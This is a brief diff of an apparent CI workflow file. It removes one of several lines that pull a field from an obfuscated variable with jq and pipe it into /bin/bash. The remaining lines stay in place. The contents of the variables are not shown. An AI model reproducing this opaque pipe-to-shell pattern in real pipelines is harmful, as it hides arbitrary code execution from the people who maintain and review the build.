@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$sftm8" | jq -r .jtvk648 | /bin/bash
           printf '%s' "$wuh4512" | jq -r .qqsdd6 | /bin/bash
           echo $rbpng00 | jq -r .x6 | /bin/bash
-          printf '%s' "$aq2" | jq -r .o366 | /bin/bash
 
       - name: Upload results
         if: always()
